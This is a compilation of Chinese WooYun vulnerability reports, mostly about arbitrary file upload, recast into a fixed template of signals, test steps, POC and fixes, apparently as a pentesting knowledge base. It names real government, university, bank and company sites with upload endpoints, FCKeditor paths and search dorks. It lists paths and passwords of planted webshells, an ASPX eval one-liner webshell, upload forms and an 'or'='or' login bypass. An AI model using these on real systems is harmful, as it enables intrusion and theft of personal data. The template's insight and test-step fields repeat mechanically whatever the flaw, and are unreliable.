
**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 以后千万不能再吃祥了~~—.—||
---

---
### [wooyun-2012-011374] 广东联通客户俱乐部任意上传
**厂商**: 联通 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 广东联通客户俱乐部fck本地构造任意上传

**POC**: http://club.gd.chinaunicom.com/UserFiles/File/c.jsp

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2014-055369] 某省某中心某系统安全问题打包（弱+任+存内+注）
**厂商**: 某省某技术中心某系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ...........

**POC**: 办公系统登陆页面  http://121.8.140.244:1000/admin/admin在红框处插入.aspx或.asp的后门点击红框处的下载即可访问http://121.8.140.244:1000/InfoSpeech/InfoSendFj/2014436541320545.aspx密码  admin连接特定的 DNS 后缀 . . . . . . . :本地链接 IPv6 地址. . . . . . . . : fe80::e1d5:8b50:b4df:be86%12IPv4 地址 . . . . . . . . . . . . : 192.168.10.5子网掩码  . . . 

**绕过**: 直接利用

**修复**: ...................
---

---
### [wooyun-2014-055092] eYou邮件系统任意文件删除
**厂商**: 北京亿中邮信息技术有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: tips:同时存在任意文件上传，任意文件删除漏洞#1 漏洞代码/user/send_queue/del_addition.php$ToRemove = post('ToRemove');//接收post参数ToRemove$size     = @filesize($ToRemove);if(is_array($_SESSION['tmpName'])){$key = array_search($ToRemove,$_SESSION['tmpName']);}else{$key = null;}if(file_exists($ToRemove)){$res = @unlink($ToRemove);//没有经过任何过滤便进入了危险函数unlink，造成任意文件删除if($res == 1){   //文件被del了if($size != false){$_SESSION['size'] -

**POC**: 根据#2 step2 点击删除，抓包修改ToRemove参数即可删除任意文件

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-042309] 上海公证网主站任意文件上传已沦陷
**厂商**: 上海公证网 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 截图的时间比测试的时候要久 汗 = =！- -我又错了 上传的时间比截图的时间要久

**POC**: 看在我讲的这么详细的份上 申精吧

**绕过**: 直接利用

**修复**: - - 俺不懂啊。。。
---

---
### [wooyun-2014-086986] 江苏科技大学某站文件过滤不严导致上传漏洞
**厂商**: 江苏科技大学 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: imagegallery编辑器漏洞，虽然过滤了aspx马的直接上传，但是可以利用iis6的解析漏洞，上传图片马。202.195.195.210

**POC**: 直接传入大马，成功拿到权限。就不提权了哈~

**绕过**: 直接利用

**修复**: 修复长传编辑器，严格过滤文件里的内容
---

---
### [wooyun-2014-054792] 某通用型高校cms任意文件上传漏洞
**厂商**: Cncert | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键字：inurl:info_details.jsp?seq上传点：http://www.website.com/editortpxx/upload.jsp例子：http://www.cnu.edu.cn/editortpxx/upload.jsp  首都师范大学http://crjy.cnu.edu.cn/zjxy/editortpxx/upload.jsp 首都师范大学继续教育学院http://www.biem.edu.cn/editortpxx/upload.jsp 北京经济管理职业学院http://sw.nedu.edu.cn/editortpxx/upload.jsp 东北电力大学http://www.usrn.edu.cn/editortpxx/upload.jsp 首都高校科研网

**POC**: 案例：http://crjy.cnu.edu.cn/zjxy/editortpxx/upload.jsp查看源码得到地址http://crjy.cnu.edu.cn/zjxy/UploadFile/8/4/50ea9b798e03103be441f757595f4c48.jsp

**绕过**: 直接利用

**修复**: ……
---

---
### [wooyun-2013-021613] CNVD国家安全漏洞共享平台任意上传
**厂商**: CNVD国家安全漏洞共享平台 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册用户 头像那任意上传似乎有人守着。。 传上去以后没几分钟就没了- -

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ?!!!
---

---
### [wooyun-2015-0145783] 鄂尔多斯农村商业银行网站后台万能口令导致敏感信息泄露(贷款人姓名、电话、身份证号)
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点开一个图片新闻，查看了下图片路径，http://**.**.**.**/uppic/3431211201011469_2.gif以及网站链接的特征onewsn.asp?id=1154可以判定鄂尔多斯农村商业银行网站使用的CMS是雷驰新闻发布管理系统，这套cms存在多个漏洞，注入、上传、万能口令。经过测试发现，注入和上传漏洞都修补了，但万能口令漏洞仍然未修补。鄂尔多斯农村商业银行网站管理后台登陆口：http://**.**.**.**/admin/ercblogin.asp用户名'or'='or'密码'or'='or后台登录代码逻辑上有缺陷,同时对单引号没有进行过滤，导致后台验证绕过语句（万能口令）可登录。后台个人贷款信息汇总模块可以下载汇总表，表包含贷款人姓名、电话、身份证号等信息。

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 1、修改后台登录代码，加强过滤。
---

---
### [wooyun-2015-0110851] 瑞安市民政局某意文件上传+文件遍历
**厂商**: 瑞安市民政局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统地址：http://122.228.236.107:8080/瑞安市民政局殡葬管理系统问题出在fck编辑器fck地址：http://122.228.236.107:8080/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://122.228.236.107:8080/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://122.228.236.107:8080/editor/filemanager/browser/default/connectors/jsp/connector

**POC**: 可跨目录任意文件上传,可直接上传jsp文件上传地址：UserFiles/Image/一句话地址：http://122.228.236.107:8080/UserFiles/Image/01.jsp密码：sq0zr

**绕过**: 直接利用

**修复**: 上传文件后缀过滤正确配置fck
---

---
### [wooyun-2012-07518] 12320网站任意文件上传漏洞
**厂商**: 12320 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是一处下载文件链接，没有检查文件路径，可下载系统上的任意文件：http://www.12320.gov.cn/manage/download.jsp?filepath=manage/login.jsp通过此方法，将整个后台的源代码下载下来，经检查，发现这个页面可上传文件，而且没有验证权限，令人震惊的是，只在客户端检查文件的类型，直接改下表单就可把jsp文件上传上去了：http://www.12320.gov.cn/manage/fujian.jsp更令人震惊的是，所有用户的密码竟然是明文保存的！！！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 网站还是几年前的技术水平，请个专业点的程序员弄弄吧
---

---
### [wooyun-2015-0149561] 百胜软件某站任意文件上传
**厂商**: baison.com.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.baison.com.cn/该站采用了泛微e-cology 通用程序，存在文件上传漏洞

**POC**: http://oa.baison.com.cn/nullwooyun.jsp

**绕过**: 直接利用

**修复**: 过滤，找厂商
---

---
### [wooyun-2014-059807] 某政务类CMS存在通用任意文件下载
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.我曾经提交过一个WooYun: 某政务服务中心系统通用任意文件上传后来仔细研究发现居然还存在一个任意文件下载的漏洞=_=!,这个发现主要源自谷歌的时候看到了某些doc文档下载，于是想想filepath有没有过滤，结果悲剧了~例如：http://www.***p.gov.cn//index/downLoadFile.action?filePath=/admin/login.jsp&fileName=test.txt

**POC**: #2.关键字我就不找了，之前那个漏洞已经提交过了。这些给cncert证明一下通用~http://g***.gov.cn/index/downLoadFile.action?filePath=index.jsp&fileName=test.txthttp://www.***.gov.cn:9999/index/downLoadFile.action?filePath=index.jsp&fileName=test.txthttp://www.***x.gov.cn/index/downLoadFile.action?filePath=index.jsp&fileName=test.txthttp

**绕过**: 直接利用

**修复**: 危害不知道大不大，不懂jsp，cncert说呢？
---

---
### [wooyun-2015-098923] 江苏省某市电子化政府采购信息网远程代码执行漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dzhcg.wuxi.gov.cn/homePage.action?action=webSiteIndex

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-038690] 某政府网FCKeditor上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 阳泉市矿区人民政府网http://www.yqkq.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2014-059325] 广州市知识产权信息网任意文件上传导致服务器沦陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过验证，这个是个第三方cms，但是任意文件上传却是私自开发的组建。通过google找到如下页面：http://www.gzipo.gov.cn/admin/jsp/cms/content/attachment/attachment.jsp?module=001010&contentId=0有个上传文件上传成功之后直接在右击源码就能看到路径

**POC**: 服务器沦陷服务器上有别人上传的提权程序，疑是已经被入侵，请尽快修补

**绕过**: 直接利用

**修复**: 有上传漏洞的页面验证下，管理员才允许上传，然后匹配下后缀吧
---

---
### [wooyun-2013-042477] TOM在线 | 分站文件任意上传#1
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #Url：http://dgbest.tom.com/application.php#对文件内容进行检测，cp jpg+php过掉#对文件后缀进行检测，抓包解决

**POC**: #Url：http://dgbest.tom.com/application.php#对文件内容进行检测，cp jpg+php过掉#对文件后缀进行检测，抓包解决

**绕过**: 直接利用

**修复**: 火速抢修
---

---
### [wooyun-2014-058130] 某电厂SCADA测试文件未清理存在任意上传漏洞(可导致服务器沦陷)
**厂商**: 南京科远 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，首先web服务器权限设置问题，可任意目录浏览。2，代码严谨性问题，没有在页面头部进行权限判定，文件上传未过滤。3，实施草率，测试文件竟然不删除。4，安全运维比较滞后，如此低级漏洞竟存在多年。

**POC**: 漏洞页面。上传执行。沦陷了。。。。由于人家服务器在正常生产运行中，拿到服务器后，我没有深入，再次向z-one致敬。下面是弱口令漏洞的印证。管理员口令重置页面。弱口令登录成功。附带一张厂商以前回应z-one截图。

**绕过**: 直接利用

**修复**: 如此低级的漏洞，你懂得怎样修复。&&&&&&&&&&&&华丽分割线&&&&&&&&&&&存在漏洞的URL，请勿公布，科远的这个系统实在太脆弱了，会影响电厂正常生产。http://124.167.244.74/syncplant/publicpage/OldTest.aspx
---

---
### [wooyun-2013-036559] 专业在线点餐（外卖）味捷外卖上传漏洞爆几万用户数据和订单数据
**厂商**: 4007123123.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 早上上班的时候碰到有人发外卖宣传单。是味捷外卖的。貌似在搞什么活动。回到公司第一件事就是测试一下他们的订餐网站。没想到还真有收获先上一张外卖单欣赏一下：

**POC**: 1，webshell3,4万多用户信息4,6万多订单信息5，成功登陆后台6，数据库信息

**绕过**: 直接利用

**修复**: 最近发现有其他人活动的痕迹。请及时处理免遭损失。求奖励：）
---

---
### [wooyun-2013-039649] 湖南省国土资源信息网上传漏洞
**厂商**: 湖南省国土资源信息网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传文件到网站根目录下：<form action="http://hunangtzy.com/comm_front/email/uploadImageFile_do.jsp?uri=/../../../" method="post" name="uploadform" enctype="multipart/form-data"><input type="file" name="NewFile"><input type="submit"></form>

**POC**: http://hunangtzy.com/cyber_jt.jsp

**绕过**: 直接利用

**修复**: 限制上传文件后缀名。
---

---
### [wooyun-2015-0112865] 上海市人民检察院某系统存在任意文件上传及文件遍历漏洞
**厂商**: 上海市人民检察院 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海市人民检察院检务公开网站管理系统地址：http://www.shjcy.gov.cn:9112/platform/integratedServices.jsp问题原因，站点使用的fck编辑器配置不当fck目录遍历：http://www.shjcy.gov.cn:9112/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../

**POC**: 任意文件上传：http://www.shjcy.gov.cn:9112/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.shjcy.gov.cn:9112/editor/filemanager/browser/default/connectors/jsp/connector这个站要上传jspx一句话地址：http://www.shjcy.gov.cn:9112//UserFiles/Image/wooyunn.jspx密码：0t2t3

**绕过**: 直接利用

**修复**: 过滤，正确配置fck
---

---
### [wooyun-2016-0171474] 海尔日日顺某运营平台配置不当致信息泄露
**厂商**: 海尔集团 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海尔日日顺微信运营平台配置不当致信息泄露和文件上传。地址：http://rmp.haier.net/1、信息泄露http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/网站的目录信息http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/opt/lampp/htdocs/

**POC**: 海尔日日顺微信运营平台配置不当致信息泄露和文件上传。地址：http://rmp.haier.net/1、信息泄露http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/网站的目录信息http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/opt/lampp/htdocs/

**绕过**: 直接利用

**修复**: 好了，就这些了哈
---

---
### [wooyun-2014-074009] 厦门市某公众服务网文件上传导致任意代码执行
**厂商**: 厦门市停车场公众服务网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://tc.xmjs.gov.cn注册地址：http://tc.xmjs.gov.cn/Parking/Regist_cmpservice.aspx漏洞页面：http://tc.xmjs.gov.cn/Parking/Cmp_info.aspx上传：

**POC**: 上刀：http://tc.xmjs.gov.cn/UpFile/Image/201408270949412393.aspx权限很大哦，提权什么的都可以来哦

**绕过**: 直接利用

**修复**: 上传点做好后缀名过滤
---

---
### [wooyun-2014-084725] 逐浪cms x2.1 x2.0版本存在文件上传漏洞官网demo测试成功(附poc)
**厂商**: 逐浪CMS | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面http://demo.zoomla.cn//Common/FileService.aspx漏洞代码protected void Page_Load(object sender, EventArgs e){string path = "/UploadFiles/UserUpload/";HttpFileCollection files = base.Request.Files;if (files.Count == 0){base.Response.Write("请勿直接访问本文件");base.Response.End();}string str2 = base.Server.MapPath(path);HttpPostedFile file = files[0];if ((file != null) && (file.ContentLength > 0)){string file

**POC**: 把一句话木马 文件名改成图片后缀比如 2.jpg<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>然后利用poc点击上传

**绕过**: 直接利用

**修复**: 禁止任意设置文件名
---

---
### [wooyun-2011-03541] phpdisk网盘上传解析漏洞
**厂商**: phpdisk.com | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 近期搞个网盘站发现的一个解析漏洞，phpdisk系统，用的蛮多，这个解析漏洞有点鸡肋，phpdisk版本不是通杀。因为是PHP程序，所以服务器一定支持PHP，这程序后台限制了php.asp.aspx.php2.等一些脚本上传。但是可以上传1.php;rar.这样的程序，利用IIS6的解析漏洞。我们把PHP马改成1.php;rar，如果改成1.php;.rar就不行了，因为他会自动变名字的。1.php;rar他变名字但是.php;rar不会被变。上传后找路径。右键电信下载1.然后属性。基本是这样的， 上传到的目录地址从robots.txt可以知道Disallow: /filestores/这个目录是默认上传目录木马地址就是这是IIS6 的漏洞。nginx 的 可以直接传一个图片一句话马，配合 2种解析漏洞。第一种是http://www.xxx.com/filestores/2011/11/2

**POC**: 你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得

**绕过**: 直接利用

**修复**: 总结与修补：此漏洞是后台过滤关键字不严格。修补方法1.在后台设置过滤掉的后缀。2。修改默认的上传目录。或者不给脚本权限。3.nginx的提高版本。4.隐藏下载地址。
---

---
### [wooyun-2015-0113065] 凯福莱特种汽车网站存在任意文件上传漏洞（似乎已被攻击过）
**厂商**: 凯福莱特种汽车网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 位置是：http://www.nbcareful.com/ckfinder/ckfinder.html已经被攻击过，小马路径：http://www.nbcareful.com/CkEditor/ckfinder/userfiles/files/z.asp/x.gif

**POC**: 位置是：http://www.nbcareful.com/ckfinder/ckfinder.html已经被攻击过，小马路径：http://www.nbcareful.com/CkEditor/ckfinder/userfiles/files/z.asp/x.gif

**绕过**: 直接利用

**修复**: 我是小白，只求邀请码，修复还是花钱请专业机构，多做测评吧。
---

---
### [wooyun-2014-081947] 某会议系统任意文件上传（第二发）
**厂商**: 华思通网络技术有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上一发：http://www.wooyun.org/bugs/wooyun-2014-081868/trace/40964e232d0086aeea5d466dddd16277这次就不那么多废话了，信息可以参考上一个漏洞

**POC**: 漏洞点：http://meetinglive.teleuc.com/site/savefile.do随便传：地址有了，上菜刀

**绕过**: 直接利用

**修复**: 参考上一发
---

---
### [wooyun-2014-064339] 某用户量较大的学习系统存在任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：中新金桥软件名叫计算机技能自助式网络视频学习系统搜索：http://203.208.46.145/#filter=0&newwindow=1&q=%E8%BD%AF%E4%BB%B6%E9%80%9A-%E4%B8%AD%E6%96%B0%E9%87%91%E6%A1%A5+inurl:softwarer&start=40http://210.41.233.137/softwarer/bbs/upload.asp此页面存在任意文件上传漏洞。

**POC**: 直接给一个简单的exp吧<html><form action="http://210.41.233.137/softwarer/bbs/upload.asp" method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>http://210.41.233.137/softwarer/bbs/upload.asp返回文件名：上传文件的路径为：http://21

**绕过**: 直接利用

**修复**: 限制上传类型可目录执行脚本
---

---
### [wooyun-2014-087384] 蚂蜂窝旗下的某业务fck编辑器漏洞（已有前人入侵）
**厂商**: 蚂蜂窝 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蚂蜂窝旗下的保险站fck编辑器漏洞（已有前人入侵！），好久了，马儿也好多，你们的服务器看来可能是沦陷了。

**POC**: 编辑器地址http://bx.mafengwo.cn/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://bx.mafengwo.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/File/Shell地址：http://bx.mafengwo.cn/https:

**绕过**: 直接利用

**修复**: 删除不必要的fck文件，设置权限
---

---
### [wooyun-2013-019462] 搜狗拼音存在任意文件上传漏洞可致沦陷
**厂商**: 搜狗 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pinyin.sogou.com/skins/dttmk.php 任意上传

**POC**: http://pinyin.sogou.com//skins/pp/1.txt

**绕过**: 直接利用

**修复**: ！
---

---
### [wooyun-2015-0122316] 财智魔方鸡肋任意文件上传和任意账号修改密码漏洞
**厂商**: caizhimofang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.头像处任意文件上传POST /member/mmember_addPhoto.action HTTP/1.1Host: www.caizhimofang.comProxy-Connection: keep-aliveContent-Length: 806Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.caizhimofang.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36Content-T

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的~
---

---
### [wooyun-2013-034833] 联想某站点因服务运维不当导致可被沦陷之一
**厂商**: 联想 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.是下面这个站点，联想企业网盘：https://www.vips100.com/2.注册账号，随便瞧瞧：3.发现可以上传头像，那么来一个吧：

**POC**: 4.上传后的图片是直接存放在web服务器上的，这个情况常常会导致服务器沦陷哦。尝试上传php文件，被服务器拒绝。偶然发现该站点存在解析漏洞，不可思议呀！这个重要的站点：5.顺利拿到shell，截图如下：6.拿到shell后，我简单的翻了下目录，太恐怖了，我都没敢去连库。谢绝跨省！

**绕过**: 直接利用

**修复**: 1.nginx解析漏洞很常见了，乌云一下吧，有详细的解决方案；2.对文件后缀进行了判断，并且保存为随机的文件名（很赞），希望能够对内容进行判断；3.建议是将上传的文件存到另一个内网服务器，或者是另一台专门存放静态文件的服务器，这样即使上传成功了php文件，也不能执行了；4.如果是在没有条件的话，建议
---

---
### [wooyun-2015-096697] oppo某服务器任意上传导致数据泄漏
**厂商**: 广东欧珀移动通讯有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cqoppo.com/Login.aspx存在遍历和任意上传的问题http://www.cqoppo.com/fckeditor//editor/dialog/fck_about.html存在fckeditor编辑器http://www.cqoppo.com/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/1.aspx     密码：101010101010101010010

**POC**: 两大数据库.服务器是server2008的

**绕过**: 直接利用

**修复**: 未深入.限制上传呢
---

---
### [wooyun-2014-076963] 189邮箱存在任意文件读取漏洞
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过登录189邮箱 发邮件 抓包修改可以传任意格式还可以读服务器的敏感文件

**POC**: 上传任意格式文件但是找不到路径

**绕过**: 直接利用

**修复**: 传文件后缀过滤下禁止访问上级目录
---

---
### [wooyun-2013-025366] 省级科技厅某系统漏洞疑似全国通用
**厂商**: 全国各省科技厅 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCKeditor上传漏洞谷歌的一个关键字：inurl:LoginPage.do?userType举例：湖南省科技厅的：http://61.187.87.49/pms-hn/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector辽宁省科技厅的：http://kjjh.lninfo.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector已经有被上传木马的了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-02986] 风讯dotNETCMS 0day
**厂商**: 风讯CMS | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞出在用户页面，注册个用户。文章管理，上传。。选择文件名不变....上传1.asp;,jpg然后你们懂的

**POC**: (见原文)

